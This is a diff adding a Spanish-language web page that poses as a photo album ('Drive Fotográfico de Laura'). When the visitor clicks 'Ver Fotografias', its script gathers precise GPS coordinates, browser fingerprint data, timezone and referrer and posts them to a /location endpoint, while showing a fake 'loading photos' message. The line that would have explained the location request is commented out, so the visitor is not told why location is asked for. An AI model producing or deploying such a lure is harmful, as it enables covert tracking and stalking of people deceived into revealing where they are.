@@ -1,0 +1,95 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Drive Fotográfico de Laura</title>
+</head>
+<body>
+  <h2>Drive Fotográfico de Laura</h2>
+  <!-- <p>Para continuar, permite el acceso a tu ubicación.</p> -->
+
+  <button id="btn">Ver Fotografias</button>
+  <p id="msg"></p>
+
+  <script>
+    const msg = document.getElementById("msg");
+
+    function getLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          return resolve({ ok: false, err: "No se pudieron Cargar las fotos" });
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          (pos) => resolve({
+            ok: true,
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: pos.coords.accuracy,
+            alt: pos.coords.altitude,
+            heading: pos.coords.heading,
+            speed: pos.coords.speed
+          }),
+          (err) => resolve({
+            ok: false,
+            err: err.message,
+            code: err.code
+          }),
+          {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+          }
+        );
+      });
+    }
+
+    async function collectAll() {
+      const payload = {
+        ts: new Date().toISOString(),
+        page: location.href,
+        referrer: document.referrer || null,
+        ua: navigator.userAgent,
+        platform: navigator.platform || null,
+        language: navigator.language || null,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
+        screen: {
+          w: screen.width,
+          h: screen.height,
+          dpr: window.devicePixelRatio
+        }
+      };
+
+      payload.gps = await getLocation();
+      return payload;
+    }
+
+    document.getElementById("btn").addEventListener("click", async () => {
+      msg.textContent = "Cargando fotos...";
+
+      try {
+        const payload = await collectAll();
+
+        msg.textContent = "Cargando fotos...";
+
+        const r = await fetch("/location", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+
+        const data = await r.json();
+
+        msg.textContent = data.ok
+          ? "✅ Cargando fotos..."
+          : "❌ Error: " + (data.msg || "No se pudo cargar las fotos.");
+      } catch (e) {
+        msg.textContent = "❌ Error: " + e.message;
+      }
+    });
+  </script>
+</body>
+</html>
